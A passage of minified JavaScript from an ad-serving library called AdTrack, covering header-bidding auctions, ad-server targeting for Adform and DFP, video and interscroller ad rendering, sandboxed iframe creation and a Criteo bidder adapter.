        i = "function" == typeof i ? i : function () {}, s = s || AdTrack.Utils.uuid(), n = n && n > 0 ? n : AdTrack.Config.getHBTimeout();
        let a = function (t) {
          let e = null;
          return "object" == typeof t ? (e = AdTrack.ID.createIdDGPM(t.d, t.g, t.p, t.m)) || Object(u.a)(!0, "Could not create unit id from given object", r.a.ERROR.TYPE.PUBLISHER_SETTINGS, r.a.ERROR.SEVERITY.LOW) : Object(u.a)(!0, "Mapping id is not an object", r.a.ERROR.TYPE.PUBLISHER_SETTINGS, r.a.ERROR.SEVERITY.LOW, {
            type: typeof t
          }), e;
        }(e);
        if (!a) return void i();
        let d = o.getAuction(s, n),
          c = l.getUnit(a);
        try {
          d.addUnit(c), c.request(t, i);
        } catch (t) {
          Object(u.c)("unit request", t, !0, a), i();
        }
      },
      getNumberOfRequestsForAdUnit: function (t) {
        if (!t || "function" != typeof t.getName) return Object(u.a)(!0, "HB2 bad id provided to getNumberOfRequestsForAdUnit", r.a.ERROR.TYPE.UNEXPECTED_STATE, r.a.ERROR.SEVERITY.LOW), 0;
        return l.getUnit(t).getNumberOfRequests();
      },
      getCurrency: function () {
        return t;
      },
      setCurrency: function (e) {
        t = e;
      },
      getRequest: function (t) {
        return d.getRequest(t);
      },
      getCurrentRequestForAdUnit: function (t) {
        return l.getUnit(t).getCurrentRequest();
      }
    };
  }();
}, function (t, e) {
  AdTrack.KeyValTargeting = function () {
    var t = {},
      e = function (t, e) {
        AdTrack.Log.debug("AdServer", "Set targeting: " + t + " => " + e, AdTrack.Log.INFO);
      },
      i = function (t, e, i) {
        for (var r in t.customTargeting) if (t.customTargeting.hasOwnProperty(r)) try {
          var n = t.customTargeting[r];
          if ("object" == typeof n) {
            if (!n.type || !n.val) continue;
            "function" === n.type && (n = new Function("cpm", n.val)(e));
          }
          i(r, n);
        } catch (t) {}
      };
    return {
      addServer: function (r) {
        var n,
          s = r.adServer;
        s && (t[s] || ("adform" === s ? t[s] = (n = !1, {
          init: function () {
            n || function () {
              var t = document.createElement("script");
              t.async = !0, t.type = "text/javascript";
              var e = "https:" === document.location.protocol;
              t.src = (e ? "https:" : "http:") + "//s1.adform.net/banners/scripts/adx.js";
              var i = document.getElementsByTagName("script")[0];
              i.parentNode.insertBefore(t, i);
            }(), n = !0;
          },
          setTargeting: function (t, r, n) {
            window.adformtag = window.adformtag || [], adformtag.push(function () {
              adformtag.setPrice(n.unitId, r), adformtag.setCustomData(n.unitId, n.adIdKey, t), e(n.adIdKey, t), i(n, r, function (t, i) {
                adformtag.setTargeting(n.unitId, t, i), e(t, i);
              });
            });
          }
        }) : "dfp" === s ? t[s] = function () {
          AdTrack.Log.debug("AdServer", "DFP adserver setup", AdTrack.Log.INFO), window.googletag && window.googletag.pubads || (window.googletag = window.googletag || {}, googletag.cmd = googletag.cmd || [], googletag.cmd.push(function () {
            googletag.pubads().disableInitialLoad();
          }), function () {
            var t = document.createElement("script");
            t.async = !0, t.type = "text/javascript";
            var e = "https:" == document.location.protocol;
            t.src = (e ? "https:" : "http:") + "//securepubads.g.doubleclick.net/tag/js/gpt.js";
            var i = document.getElementsByTagName("script")[0];
            i.parentNode.insertBefore(t, i);
          }());
          return {
            init: function () {
              AdTrack.Log.debug("AdServer", "DFP adserver init", AdTrack.Log.INFO), googletag.cmd.push(function () {
                googletag.pubads().refresh();
              });
            },
            setTargeting: function (t, r, n) {
              var s;
              (AdTrack.Log.debug("AdServer", "DFP set targeting", AdTrack.Log.INFO), window.googletag = window.googletag || {}, googletag.cmd = googletag.cmd || [], "function" == typeof window.googletag.pubads && "function" == typeof window.googletag.pubads().getSlots) && (window.googletag.pubads().getSlots().forEach(function (a) {
                n.unitId !== a.getAdUnitPath() && n.unitId !== a.getSlotElementId() || (s = !0, AdTrack.Log.debug("AdServer", "DFP targeting slot: " + n.unitId, AdTrack.Log.INFO), a.setTargeting(n.adIdKey, t), e(n.adIdKey, t), i(n, r, function (t, i) {
                  a.setTargeting(t, i), e(t, i);
                }));
              }), s || AdTrack.Log.debug("AdServer", "DFP slot " + n.unitId + " not available.", AdTrack.Log.WARNING));
            }
          };
        }() : "bb" === s && (t[s] = {
          init: function () {},
          setTargeting: function (t, e, i) {}
        })));
      },
      setTargeting: function (e, i, r) {
        var n = r.adServer;
        "function" == typeof t[n].setTargeting && t[n].setTargeting(e, i, r);
      },
      init: function () {
        for (var e in t) t.hasOwnProperty(e) && "function" == typeof t[e].init && t[e].init();
      }
    };
  };
}, function (t, e) {
  AdTrack.hb = AdTrack.hb || function () {
    var t = AdTrack.KeyValTargeting(),
      e = !1,
      i = !1,
      r = {},
      n = [],
      s = 4e3,
      a = 0,
      o = 0,
      d = {},
      c = {},
      h = function (t, e, i) {
        Math.floor(1e5 * Math.random());
        var r = !1,
          n = t,
          s = AdTrack.Utils.time(),
          a = e,
          o = null,
          d = function (t, e) {
            return e >= t ? 1 : t - e;
          },
          c = d(e, i),
          h = {
            clear: function () {
              clearTimeout(o);
            },
            call: function () {
              clearTimeout(o), r = !0, n();
            },
            reschedule: function (t) {
              if (a !== t && !r) {
                clearTimeout(o);
                var e = AdTrack.Utils.time() - s,
                  n = d(t, i);
                n <= e ? h.call() : (c = n - e, o = setTimeout(function () {
                  h.call();
                }, c));
              }
            }
          };
        return o = setTimeout(function () {
          h.call();
        }, c), h;
      },
      l = function (t, e) {
        return t[e] || (t[e] = {}), t[e];
      },
      u = function () {
        return a > 0 && o === a;
      },
      p = function (t, e, i) {
        e = e || f(t), r[t].length > 0 && (r[t].forEach(function (t) {
          t(e);
        }), r[t] = []);
      },
      f = function (t) {
        if (!c[t]) return [];
        var e = c[t],
          i = [],
          r = 0;
        for (var n in e) if (e.hasOwnProperty(n)) {
          var s = 0,
            a = [];
          if (!!e[n].adID) e[n].price && (s = e[n].price, a.push(e[n]));else {
            var o = 0;
            for (var d in e[n]) e[n].hasOwnProperty(d) && e[n][d].adID && e[n][d].price && (o += e[n][d].price, a.push(e[n][d]));
            s = o;
          }
          s > r && (r = s, i = a);
        }
        return i;
      },
      g = function () {
        if (!i) {
          for (var r in AdTrack.Log.debug("HB", "Notify adserver", AdTrack.Log.INFO), i = !0, c) if (c.hasOwnProperty(r)) {
            var n = f(r);
            n.forEach(function (e) {
              e.targeting && e.setTargeting && e.price > 0 && (AdTrack.Log.debug("HB", "Set targeting for " + e.adID + ", bid cpm: " + e.price, AdTrack.Log.INFO), t.setTargeting(e.adID, e.price, e.targeting));
            }), p(r, n, !1);
          }
          e && t.init(), !1;
        }
      },
      m = AdTrack.Utils.errorReporting(AdTrack.Config.getReportingUrl(), AdTrack.url, !0, AdTrack.Config.getHBDomain());
    let k = function (t) {
      return function () {
        m.doError("Function '" + t + "' not implemented");
      };
    };
    return {
      isRunning: k("isRunning"),
      useTimeout: function (t) {
        t !== s && function (t) {
          n.forEach(function (e) {
            e.reschedule(t);
          });
        }(s = t);
      },
      addPlacement: function (e, i, n, s, o, d, h) {
        h && (n = null);
        var u = {
            adID: e,
            finished: !1,
            price: 0,
            targeting: s,
            isBranding: !!o,
            setTargeting: !!d,
            dgpmMapping: h
          },
          p = l(c, i);
        (n ? l(p, n) : p)[e] = u, r[i] || (r[i] = []), t && s && t.addServer(s), a++;
      },
      bidResponse: function (t, e, i, r, n, s, d, h) {
        if (c[r] && (!n || c[r][n])) {
          var l = (n ? c[r][n] : c[r])[i];
          l && (t || 0 === t) && (l.finished = !0, l.price = parseFloat(t), l.currency = e, l.dealId = s, l.response = d, l.options = h || {}, o++), l.dgpmMapping ? p(r, [l], !1) : u() && (AdTrack.Log.debug("HB", "Bids back: [" + o + ", " + a + "]", AdTrack.Log.INFO), g());
        }
      },
      useAdServerInitialisation: k("useAdServerInitialisation"),
      getHighestBidForAdUnit: function (t, e, i) {
        if ("function" == typeof e) {
          i < 0 && (i = 0);
          var a = !1;
          if ("object" == typeof t) {
            var o = AdTrack.ID.createIdDGPM(t.d, t.g, t.p, t.m);
            if (!o) return void e([]);
            t = o.getName(), a = !0;
          }
          if (a || !AdTrack.Config.getHBDomain()) {
            if ("function" == typeof e) if (c[t] || (c[t] = {}, r[t] || (r[t] = [])), d[t] || (d[t] = {}), d[t].timeout = s, u() || a && c[t][t] && c[t][t].finished) d[t].ready = !0, e(f(t));else {
              r[t].push(e), d[t].ready = !1, d[t].start = AdTrack.Utils.time();
              n.push(new h(function () {
                d[t].called = AdTrack.Utils.time(), d[t].timeout = s, !a || c[t][t] && c[t][t].finished ? p(t, f(t), !0) : AdTrack.call(t, "hbAuctionTimeout");
              }, s, i));
            }
          } else e([]);
        }
      },
      getCPM: k("getCPM"),
      reset: function () {
        if (AdTrack.Config.isHBRefreshEnabled()) {
          i = !1, a = 0, o = 0, c = {}, r = {};
          for (var t = n.shift(); t;) t.clear(), t = n.shift();
        }
      },
      softReset: function (t) {
        r[t] && (r[t] = []), c[t] && (c[t] = {});
      },
      stats: d
    };
  }();
}, function (t, e) {
  var i;
  AdTrack.MediaTypes.Video = function (t, e) {
    AdTrack.MediaTypes.Base.call(this, t, e), this.player = null, this.element = null;
  }, AdTrack.MediaTypes.Video.prototype = Object.create(AdTrack.MediaTypes.Base.prototype), AdTrack.MediaTypes.Video.prototype.constructor = AdTrack.MediaTypes.Video, (i = AdTrack.MediaTypes.Video.prototype).handleData = function (t) {
    return t.ad ? (t.ad.type || this.error("Video: Undefined type"), t.ad.data || this.error("Video: Undefined data")) : this.error("Video: Undefined ad source"), t.count = t.count || 1, t.style = t.style || null, t;
  }, i.getElement = function () {
    return this.element;
  }, i.handleRender = function (t, e) {
    if (this.data.externalRender) this.element = AdTrack.iframeCreator.factory.createIframeWithContent(t, this.data.width || 0, this.data.height || 0, window.location.href, this.data.ad.data, null), null === this.element && this.error("Video: Error while creating iframe");else {
      var i = !1;
      try {
        var r = new AdTrack.Player(t, this.data.ad.data, this.data.ad.type, this.data.options, this.data.server);
        if (r.on("end", function () {
          this.events.trigger("end");
        }.bind(this)), r.on("start", function () {
          i = !0, this.events.trigger("load");
        }.bind(this)), r.on("skip", function () {
          this.close();
        }.bind(this)), r.on("error", function () {
          if (i) this.destroy();else {
            var t = r.getFrame();
            t.parentNode.removeChild(t);
          }
          this.error();
        }.bind(this)), this.player = r, this.element = r.getFrame(), !this.element) throw new Error("No iframe");
        r.play();
      } catch (t) {
        this.player && this.player.dispose(), this.error("VIDEO (" + this.data.chd.tag + ") - " + t.message);
      }
    }
    e && e.customTransform(function () {
      this.element.parentNode.removeChild(this.element);
    }.bind(this));
  }, i.handlePreload = function (t, e) {
    var i = AdTrack.Utils.windowTopAccess(),
      r = !1,
      n = function (t) {
        if (t && "adtrack-vpaid-pb" === t.data) {
          if (r) return void this.error("vpaid pb - multiple calls");
          r = !0, this.player && !this.isLoaded && (this.error(), this.player.dispose());
        }
      }.bind(this);
    this.data.preload.vpaidPb && i && AdTrack.Utils.addEvent(i, "message", n), this.data.preload.timeout && (this.data.options = this.data.options || {}, this.data.options.timeout = this.data.preload.timeout);
    var s = function () {
      i && AdTrack.Utils.removeEvent(i, "message", n);
    };
    this.on("load", function () {
      s();
    }), this.on("error", function () {
      s();
    }), this.handleRender(t, e), this.data.preload.func && "function" == typeof this.data.preload.func && this.data.preload.func();
  }, i.destroy = function () {
    this.player && this.player.dispose();
  };
}, function (t, e) {
  var i, r, n, s, a, o, d, c, h, l;
  AdTrack.Ext = AdTrack.Ext || (i = [], r = !1, n = [], s = {}, a = "true" === AdTrack.Utils.getParameterByName("adtrack-debug") || AdTrack.Utils.getLocalStorageItem("adtrack-debug"), o = function (t) {
    r ? n.forEach(function (e) {
      e.postMessage(t);
    }) : i.push(t);
  }, d = null, c = function () {
    (d = new MessageChannel()).port1.onmessage = function (t) {
      if ("adtrack" === t.data) {
        var e = t.ports[0];
        r = !0, n.push(e), i.forEach(function (t) {
          e.postMessage(t);
        });
      } else r && function (t) {
        var e = t.data.command,
          i = t.data.data;
        if ("highlight" === e) AdTrack.call(i.placement, e, i.hide);else if ("bid:getBidResponse" === e) {
          var r = AdTrack.units[i.placement];
          if (r) {
            var n = null,
              s = null;
            try {
              var a = r.processedChannels[i.tierIndex][i.channelIndex];
              n = a.response || a.response1 || null, s = a.bidResponse || null;
            } catch (t) {}
            o({
              command: "bid:bidResponse",
              data: {
                bidResponseAdTrack: JSON.stringify(s, null, 2),
                bidResponseSSP: JSON.stringify(n, null, 2),
                placement: i.placement,
                tierIndex: i.tierIndex,
                channelIndex: i.channelIndex,
                tag: a.chd.tag,
                flag: a.chd.flag
              }
            });
          }
        }
      }(t);
    }, window.top.postMessage("adtrack", "*", [d.port2]);
  }, h = 0, l = setInterval(function () {
    if (r || h >= 3) clearInterval(l);else try {
      h++, c();
    } catch (t) {}
  }, 1e3), s.sendResponse = function (t, e, i, r, n) {
    t && e && r && o({
      command: "response",
      data: {
        placement: "" + t,
        channel: i ? e + "#" + i : e,
        response: r,
        style: n
      }
    });
  }, a && "function" == typeof AdTrack.Log.extensionDump && setInterval(function () {
    o({
      command: "adtrack-debug-dump",
      data: AdTrack.Log.extensionDump()
    });
  }, 1e3), s);
}, function (t, e) {
  AdTrack.Animator = function (t, e) {
    this.phase = t.phase || 0, this.duration = t.duration || 1, this.fps = t.fps || 20, this.timer = null, this.callback = e;
  }, AdTrack.Animator.prototype = {
    forward: function () {
      this.vector = 1, this.timer && clearTimeout(this.timer), this.timer = null, this.phase < 1 && this.animate();
    },
    backward: function () {
      this.vector = -1, this.timer && clearTimeout(this.timer), this.timer = null, this.phase > 0 && this.animate();
    },
    animate: function () {
      Math.sin(this.phase * Math.PI / 2);
      this.phase += this.vector / (this.fps * this.duration), this.phase >= 1 ? this.phase = 1 : this.phase <= 0 ? this.phase = 0 : this.timer = setTimeout(this.animate.bind(this), 1e3 / this.fps), this.callback(this.phase);
    }
  };
}, function (t, e) {
  AdTrack.InterScrollRenderer = function (t, e, i, r, n, s) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.transforms = i, this.events = r, this.errorReporting = n, this.metrics = s, this.channel = null, this.container = null, this.channel = null, this.renderedChannel = null, this.isLoaded = !1, this.width = 0, this.height = 0, this.realWidth = 0, this.realHeight = 0, this.viewportWidth = 0, this.landscape = !1, this.noScroll = this.definitionObj.getOption("noScroll"), this.c = null, this.wrap = null, this.clipper = null, this.banner = null, this.zeroSizeErrorReported = !1, this.resizeListener = function () {
      this.isReadyToShow() && this.events.trigger("ready"), this.isLoaded && this.setUp();
    }.bind(this), AdTrack.BrowserFlags.isPhone ? AdTrack.Utils.addEvent(this.window, "orientationchange", this.resizeListener) : AdTrack.Utils.addEvent(this.window, "resize", this.resizeListener);
  }, AdTrack.InterScrollRenderer.prototype = {
    getContainer: function () {
      return this.container;
    },
    createContainer: function (t) {
      return this.container || (this.mainWrap = t, this.c = this.window.document.createElement("div"), this.wrap = this.window.document.createElement("div"), this.clipper = this.window.document.createElement("div"), this.banner = this.window.document.createElement("div"), this.adNoticeTop = this.window.document.createElement("div"), this.adNoticeBot = this.window.document.createElement("div"), this.c.appendChild(this.wrap), this.wrap.appendChild(this.adNoticeTop), this.wrap.appendChild(this.clipper), this.wrap.appendChild(this.adNoticeBot), this.clipper.appendChild(this.banner), t.appendChild(this.c), this.banner.style.display = "none", this.container = this.banner), this.container;
    },
    isReadyToShow: function () {
      return !!this.noScroll || AdTrack.Utils.getViewportRealWidth(this.window) <= AdTrack.Utils.getViewportRealHeight(this.window);
    },
    setUp: function () {
      if (this.width && this.height) {
        var t = 720 == this.width && 1280 == this.height,
          e = AdTrack.Utils.getViewportRealWidth(this.window),
          i = AdTrack.Utils.getViewportRealHeight(this.window),
          r = e > i;
        if (0 !== e && 0 !== i || this.zeroSizeErrorReported || (this.zeroSizeErrorReported = !0, this.errorReporting.doError("Interscroller in zero size container (" + e + " " + i + ")")), this.viewportWidth === e && r === this.landscape) return;
        if (this.viewportWidth = e, this.landscape = r, e > i && !this.noScroll) return void this.hide();
        var n = e / this.width,
          s = i / this.height,
          a = Math.min(n, s);
        if (t) {
          var o = Math.max(n, s),
            d = e / (this.width - 140),
            c = i / (this.height - 320);
          a = Math.min(o, c, d);
        }
        this.noScroll && (a = n), this.realWidth = this.width * a, this.realHeight = this.height * a, this.show();
        var h = function (t, e) {
            return (t - e) / 2;
          },
          l = h(e, this.realWidth),
          u = h(i, this.realHeight),
          p = this.noScroll ? 1 : (T = this.definition.options.interscrollerVerticalLimit, (T = parseFloat(T)) && !isNaN(T) ? (T > 1 && (T *= .01), T < .5 ? .5 : T > 1 ? 1 : T) : 1),
          f = !!this.noScroll || this.definition.options.interscrollerHideAdNotice,
          g = Math.round(.025 * i),
          m = Math.round(.65 * g),
          k = i * p;
        this.noScroll && (k = this.realHeight), f || (k += 2 * g);
        var b = this.definition.options.interscrollerBackground ? this.definition.options.interscrollerBackground : "black";
        this.c.setAttribute("style", "display: block; width: auto; height: " + k + "px; position: relative; z-index: 0; "), this.wrap.setAttribute("style", "display: block; width: " + e + "px; height:" + k + "px; position: absolute; top: 0; left: 0; overflow: hidden; box-shadow: 0px 0 4px 0px; background: " + b + ";"), this.noScroll ? this.banner.setAttribute("style", "display: block; width: " + this.width + "px; height: " + this.height + "px; top: " + u + "px; left: " + l + "px; transform: translateZ(0px); max-width: initial; max-height: initial;") : (this.clipper.setAttribute("style", "display: block; width: 100%; height: 100%; position: absolute; top: 0; left: 0; overflow: hidden; clip-path: inset(0px); clip: rect(0px auto auto 0px);"), this.banner.setAttribute("style", "display: block; width: " + this.width + "px; height: " + this.height + "px; position: fixed; top: " + u + "px; left: " + l + "px; transform: translateZ(0px); max-width: initial; max-height: initial;")), this.adNoticeTop.setAttribute("style", "background: black; color: white; position: absolute; z-index: 4; top: 0px; left: 0px; right: 0px; width: auto; margin: 0px; display: block; padding: 0; text-align: center; text-transform: uppercase; font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: " + m + "px; line-height: " + g + "px; font-family: Helvetica, Arial, sans-serif; box-shadow: black 0px 1px 10px;"), this.adNoticeBot.setAttribute("style", "background: black; color: white; position: absolute; z-index: 4; bottom: 0px; left: 0px; right: 0px; width: auto; margin: 0px; display: block; padding: 0; text-align: center; text-transform: uppercase; font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: " + m + "px; line-height: " + g + "px; font-family: Helvetica, Arial, sans-serif; box-shadow: black 0px 1px 10px;");
        var v = this.definition.options.fixedShowAdNotice ? this.definition.options.fixedShowAdNotice : "Reklama";
        this.adNoticeTop.innerHTML = v, this.adNoticeBot.innerHTML = v, f && (this.adNoticeTop.style.display = "none", this.adNoticeBot.style.display = "none");
        var A = "scale(" + a + ")";
        this.banner.style.webkitTransform = A, this.banner.style.MozTransform = A, this.banner.style.msTransform = A, this.banner.style.OTransform = A, this.banner.style.transform = A, this.banner.style.transformOrigin = "left top", setTimeout(function () {
          var t = null;
          try {
            t = this.c.getBoundingClientRect(), this.wrap.style.left = -t.left + "px";
          } catch (t) {}
        }.bind(this), 100), "function" == typeof AdTrack.Utils.isTransformOnElement && setTimeout(function () {
          AdTrack.Utils.isTransformOnElement(this.window, this.mainWrap, !0) && this.errorReporting.doError("Interscroller is inside of element with transform");
        }.bind(this), 1e3);
      }
      var T;
    },
    measureImpress: function () {
      return AdTrack.Viewability.getVisiblePercentage(this.wrap);
    },
    loaded: function (t) {
      this.isLoaded = !0, AdTrack.interscroller = !0;
      var e = t.data.style ? t.data.style.options.width : null,
        i = t.data.style ? t.data.style.options.height : null,
        r = e || t.data.width || this.definition.options.width,
        n = i || t.data.height || this.definition.options.height;
      r && n ? (this.width = r, this.height = n, this.setUp()) : this.errorReporting.doError("Undefined width or height");
    },
    destroy: function () {},
    show: function () {
      this.mainWrap && (this.mainWrap.style.display = "block");
    },
    hide: function () {
      this.mainWrap && (this.mainWrap.style.display = "none");
    },
    open: function () {},
    close: function () {}
  };
}, function (t, e) {
  function i(t, e, r, n, s) {
    var a = {
      container: t || document.body,
      html: e || "",
      listeners: r || {},
      domain: n || document.domain,
      element: document.createElement("iframe"),
      sandbox: ["allow-popups", "allow-popups-to-escape-sandbox", "allow-forms", "allow-orientation-lock", "allow-same-origin", "allow-scripts", "allow-top-navigation-by-user-activation"],
      resolved: !1,
      document: !1,
      window: !1,
      sandboxed: !s
    };
    return i.append(a), i.resolve(a) ? i.populate(a) : i.populate(a, document.domain), a;
  }
  var r;
  window.AdTrack || (window.AdTrack = {}), window.AdTrack.iframeCreator = i, i.append = function (t) {
    i.trigger(t, "onBeforeAppend"), t.sandboxed && t.element.setAttribute("sandbox", t.sandbox.join(" ")), t.container.appendChild(t.element), i.trigger(t, "onAfterAppend");
  }, i.populate = function (t, e) {
    e ? (t.element.populate = i.populate, t.element.src = 'javascript:(document.open().domain="' + e + '") && frameElement.populate(frameElement)') : (i.resolve(t), i.trigger(t, "onBeforePopulate"), t.element.frameElement = t.element, t.document.write(t.html), t.document.close(), i.trigger(t, "onAfterPopulate"));
  }, i.trigger = function (t, e) {
    var i = t.listeners[e];
    return i && i(t, e);
  }, i.resolve = function (t) {
    try {
      t.window = t.element.contentWindow, t.document = t.element.contentDocument || t.window && t.window.document;
    } catch (t) {}
    return t.resolved = !(!t.window || !t.document);
  }, i.factory = (r = function (t, e, i, r, n) {
    var s = (e || 0 === e) && (i || 0 === i),
      a = n ? "100%" : e,
      o = n ? "100%" : e + "px";
    s && (t.setAttribute("width", a), t.setAttribute("height", i)), t.setAttribute("style", "border:0; margin:auto; display:block; max-width: none; max-height: none; " + (s ? "width:" + o + "; height:" + i + "px;" : "")), t.setAttribute("frameborder", "0"), t.setAttribute("marginheight", "0"), t.setAttribute("marginwidth", "0"), t.setAttribute("scrolling", "no"), r && function (t, e, i) {
      var r = t.tagName,
        n = null;
      n = setInterval(function () {
        try {
          var s = (i || t.ownerDocument || window.document).activeElement;
        } catch (t) {
          return;
        }
        s && s.tagName == r && s == t && (clearInterval(n), e());
      }, 100);
    }(t, r);
  }, {
    createIframeWithContent: function (t, e, n, s, a, o, d) {
      try {
        return i(t, a, {
          onBeforeAppend: function (t) {
            var i = t.element;
            r(i, e, n, o, d);
          }
        }, s).element;
      } catch (t) {
        return null;
      }
    },
    createIframeFromHTML: function (t, e, i) {
      try {
        var n = "ifId" + Math.round(1e6 * Math.random());
        e = e.replace("<iframe", "<iframe id='" + n + "'"), t.innerHTML = e;
        var s = t.querySelector("#" + n);
        return r(s, null, null, i), s;
      } catch (t) {
        return null;
      }
    }
  });
}, function (module, exports) {
  AdTrack.Criteo = AdTrack.Criteo || function () {
    if (!window.criteo_pubtag || window.criteo_pubtag instanceof Array || !window.Criteo || !window.Criteo.RequestBids) {
      var reporting = AdTrack.Utils.errorReporting(AdTrack.Config.getReportingUrl(), AdTrack.url, !1);
      window.Criteo = window.Criteo || {}, window.Criteo.events = window.Criteo.events || [];
      var sProt = "http:" === window.location.protocol ? "http:" : "https:",
        publisherTagUrl = sProt + "//static.criteo.net/js/ld/publishertag.standalone.js",
        fallback = function () {
          var t = document.createElement("script");
          t.setAttribute("src", publisherTagUrl), document.getElementsByTagName("head")[0].appendChild(t);
        };
      try {
        var storageKey = "adtrack-lib-criteo",
          storageExpireKey = storageKey + "-expire",
          code = AdTrack.Utils.getLocalStorageItem(storageKey),
          expire = AdTrack.Utils.getLocalStorageItem(storageExpireKey);
        code && expire && expire >= AdTrack.Utils.time() ? eval(code) : (expire && AdTrack.Utils.time(), AdTrack.Ajax.request({
          url: publisherTagUrl,
          method: "GET",
          async: !0,
          withCredentials: !1,
          headers: {
            "Content-type": "application/javascript"
          }
        }).done(function (response) {
          var expirationTime = AdTrack.Utils.time() + 6048e5,
            success;
          success = AdTrack.Utils.setLocalStorageItem(storageKey, response), success = AdTrack.Utils.setLocalStorageItem(storageExpireKey, expirationTime), eval(response);
        }).fail(function (t, e) {
          fallback();
        }).send());
      } catch (t) {
        fallback();
      }
    }
    var _getStoredItem = function (t) {
        return AdTrack.Utils.readCookie(t) || AdTrack.Utils.getLocalStorageItem(t);
      },
      api = {
        BANNER: "banner",
        NATIVE: "native",
        VIDEO: "video",
        parseKey: function (t) {
          if (!t) return {};
          var e = "",
            i = "",
            r = (t = "" + t).indexOf("-");
          return r < 0 ? isNaN(t) ? i = t : e = t : (e = t.substr(0, r), i = t.substr(r + 1), isNaN(e) && (e = "", i = t)), {
            zoneId: e,
            subId: i
          };
        },
        bid: function (t, e, i, r, n, s) {
          var a = [];
          e.width && e.height && a.push(e.width + "x" + e.height), e.sizes && e.sizes.length > 0 && e.sizes.forEach(function (t) {
            2 === t.length && a.push(t[0] + "x" + t[1]);
          });
          var o = null;
          AdTrack.CMP && (o = AdTrack.CMP.getConsentData());
          var d = null;
          AdTrack.USP && (d = AdTrack.USP.getConsentData());
          var c = api.buildContext(o, d),
            h = api.buildCdbUrl(c);
          "classic_centrum.cz_email_300x600" === t.unitID.getName() && (h = api.buildStandardCdbUrl());
          var l = !!t.getOption("disableUserId"),
            u = api.buildCdbData(c, r, a, n, l);
          if (!u) return t.doError("Wrong format for key, should be either [zoneid]-[publisherSubid] or just zoneid"), void (s && s(null, null));
          var p = !!o,
            f = !(!d || !d.consentString);
          (p || f) && t.evBidConsent(t.definition, e, p, f), AdTrack.Ajax.request({
            label: "Criteo " + n + " bid",
            url: h,
            method: "POST",
            data: JSON.stringify(u),
            json: !0,
            async: !t.definition.options.noAsync,
            headers: {},
            timeout: e.timeout || 1500,
            ontimeout: function () {
              t.evBidTimeout(t.definition, e, !0);
            },
            onerror: function () {
              t.evBidError(t.definition, e, !0);
            }
          }, t.errorReporting).done(function (t) {
            var r = null;
            if (t && t.slots) {
              var a = t.slots[0];
              a && (r = AdTrack.Price.create(a.cpm, AdTrack.Price.EUR, null), i.setPrice(r), n === api.NATIVE ? (i.setWidth(e.width || a.width), i.setHeight(e.height || a.height)) : (i.setWidth(a.width || e.width), i.setHeight(a.height || e.height)));
            }
            s && s(r, t);
          }).fail(function (i, r) {
            r ? t.evBidTimeout(t.definition, e) : t.evBidError(t.definition, e), s && s(null, null);
          }).send();
        },
        transformImpPixels: function (t) {
          if (t && Array.isArray(t) && t.length > 0) {
            for (var e = [], i = 0; i < t.length; i++) {
              var r = t[i];
              e.push(r.url);
            }
            return e;
          }
          return null;
        },
        buildContext: function (t, e) {
          var i = {
            url: AdTrack.url,
            integrationMode: void 0
          };
          "object" == typeof t && (i.consent = t), "object" == typeof e && (i.uspConsent = e);
          try {
            i.debug = "1" === AdTrack.Utils.getParameterByName("pbt_debug"), i.noLog = "1" === AdTrack.Utils.getParameterByName("pbt_nolog");
          } catch (t) {}
          return i;
        },
        buildStandardCdbUrl: function () {
          var t = _getStoredItem("cto_bundle"),
            e = _getStoredItem("cto_idcpy"),
            i = _getStoredItem("cto_idfs"),
            r = _getStoredItem("cto_sid"),
            n = "https://bidder.criteo.com/cdb";
          return n += "?ptv=79", n += "&profileId=207", n += t ? "&bundle=" + t : "", n += e ? "&idcpy=" + e : "", n += i ? "&idfs=" + i : "", n += r ? "&sid=" + r : "", n += _getStoredItem("cto_optout") ? "&optout=1" : "", n += "&cb=" + Math.floor(99999999999 * Math.random());
        },
        buildCdbUrl: function (t) {
          var e = {
              amp: 1
            },
            i = "https://bidder.criteo.com/cdb";
          return i += "?profileId=207", i += "&ptv=74", i += "&av=21", i += "&cb=" + Math.floor(99999999999 * Math.random()), e[t.integrationMode] && (i += "&im=" + e[t.integrationMode]), t.debug && (i += "&debug=1"), t.noLog && (i += "&nolog=1"), i;
        },
        buildCdbData: function (t, e, i, r, n) {
          if (e) {
            var s = "",
              a = "",
              o = (e = "" + e).indexOf("-");
            if (o < 0 ? isNaN(e) ? a = e : s = e : (s = e.substr(0, o), a = e.substr(o + 1), isNaN(s) && (s = "", a = e)), !s && !a) return null;
            var d = {
                transactionid: AdTrack.Utils.uuid(),
                auctionId: AdTrack.Utils.uuid(),
                sizes: i,
                impid: "ad" + (s ? "-" + s : "") + (a ? "-" + a : "")
              },
              c = {
                url: t.url
              };
            s ? d.zoneid = s : c.networkid = AdTrack.Config.getAccountId("criteo"), a && (d.publishersubid = a), r === api.NATIVE ? d.native = !0 : r === api.VIDEO && (d.video = {
              playersizes: i,
              mimes: ["video/mp4"],
              protocols: [2, 3, 5, 6],
              api: [1, 2],
              placement: 1,
              playbackmethod: 1,
              minduration: 0,
              maxduration: 30,
              startdelay: 0,
              skip: 0
            });
            var h = {
              slots: [d],
              publisher: c,
              user: {}
            };
            return AdTrack.UserID && !n && (h.user.ext = {
              prebid_criteoid: AdTrack.UserID.getCriteoId()
            }), t.consent && (h.gdprConsent = {
              consentData: t.consent.consentString || "",
              gdprApplies: !!t.consent.gdprApplies
            }), t.uspConsent && t.uspConsent.consentString && (h.user.uspIab = t.uspConsent.consentString), h;
          }
          return null;
        }
      },
      impressions = {};
    return api.impression = function (t, e, i) {
      i || (i = "none"), impressions[t] || (impressions[t] = {}), impressions[t][e] || (impressions[t][e] = {}), impressions[t][e][i] ? impressions[t][e][i]++ : impressions[t][e][i] = 1;
    }, api.hasImpression = function (t, e, i) {
      return api.getImpressionCount(t, e, i) > 0;
    }, api.getImpressionCount = function (t, e, i) {
      return i || (i = "none"), t && e && impressions[t] && impressions[t][e] && impressions[t][e][i] ? impressions[t][e][i] : 0;
    }, api;
  }();
}, function (t, e) {
  AdTrack.SmartHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i;
  }, AdTrack.SmartHelper.prototype = {
    bid: function (t, e, i) {
      var r = function (e) {
          this.response = e;
          var r = null;
          if (e && e.ad) {
            var n = AdTrack.Utils.isBlackListedAds(e.ad),
              a = AdTrack.Utils.testAd(e.ad, this.definition.options.contentBlackList || []);
